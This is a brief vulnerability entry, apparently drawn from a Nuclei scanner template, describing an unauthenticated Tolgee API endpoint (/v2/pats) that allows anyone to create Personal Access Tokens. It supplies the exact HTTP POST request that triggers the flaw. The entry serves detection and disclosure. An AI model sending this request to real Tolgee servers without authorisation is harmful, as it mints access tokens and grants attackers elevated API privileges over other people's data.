# Vulnerability: Tolgee API - Misconfiguration Anonymous Access
**Classification:** API
**Source:** Nuclei Template (`tolgee-api-anonymous.yaml`)

## Description
The Tolgee API exposes the `/v2/pats` endpoint without requiring authentication, allowing attackers to create Personal Access Tokens (PATs). These tokens can then be leveraged to interact with the API and gain elevated privileges.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /v2/pats HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip

{"description":"{{string}}"}
```

